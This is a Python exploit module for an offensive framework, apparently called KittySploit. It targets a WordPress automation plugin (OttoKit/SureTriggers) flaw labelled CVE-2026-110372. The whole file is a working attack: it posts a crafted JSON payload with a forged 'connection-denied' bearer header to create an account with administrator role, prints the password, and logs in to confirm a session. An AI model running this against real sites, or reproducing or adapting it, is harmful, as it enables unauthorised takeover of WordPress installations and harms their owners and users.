#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OttoKit CVE-2026-110372 — create administrator via connection-denied bearer."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "OttoKit CVE-2026-110372 connection-denied privesc",
        "description": (
            "CVE-2026-110372: POST /wp-json/sure-triggers/v1/automation/action with "
            "st-authorization: Bearer connection-denied creates WordPress users with attacker-chosen role."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-110372"],
        "references": ["https://wpsec.com/vuln/WPSEC-2026-1053/"],
        "tags": [
            "auxiliary", "wordpress", "ottokit", "suretriggers", "cve-2026-110372"],
        "agent": {
            "risk": "critical",
            "effects": ["active_exploitation", "account_creation"],
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
        },
    }

    path = OptString("/", "WordPress base path", required=False)
    role = OptString("administrator", "Role for created user", required=False)

    def _base(self) -> str:
        return self.wp_normalize_base_path(self.path or "/")

    def _join(self, suffix: str) -> str:
        root = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def run(self):
        user = f"ks{secrets.token_hex(4)}"
        email = f"{user}@example.test"
        pwd = secrets.token_urlsafe(14)
        role = (self.role or "administrator").strip()
        payload = json.dumps(
            {
                "integration": "WordPress",
                "type_event": "create_user_if_not_exists",
                "selected_options": {
                    "user_name": user,
                    "user_email": email,
                    "password": pwd,
                    "first_name": "Kitty",
                    "last_name": "Sploit",
                    "role": role,
                    "force_update_user_role": True,
                    "add_user_roles": True,
                    "show_password": True,
                },
            }
        )
        r = self.http_request(
            method="POST",
            path=self._join("/wp-json/sure-triggers/v1/automation/action"),
            headers={
                "Content-Type": "application/json",
                "st-authorization": "Bearer connection-denied",
            },
            data=payload,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            print_error("Automation action failed")
            return False
        text = r.text or ""
        if '"success":true' not in text.replace(" ", "") and '"success": true' not in text:
            print_error("API did not return success")
            print_status(text[:600])
            return False
        print_success(f"User {user} created (role={role})")
        print_status(f"Password: {pwd}")
        login = self.http_request(
            method="POST",
            path=self._join("/wp-login.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": "wordpress_test_cookie=WP Cookie check"},
            data={"log": user, "pwd": pwd, "wp-submit": "Log In", "testcookie": "1"},
            allow_redirects=False,
        )
        if login and login.status_code == 302 and "wordpress_logged_in" in str(login.headers):
            print_success("WordPress session established")
            return True
        print_warning("User created; login check failed")
        return True
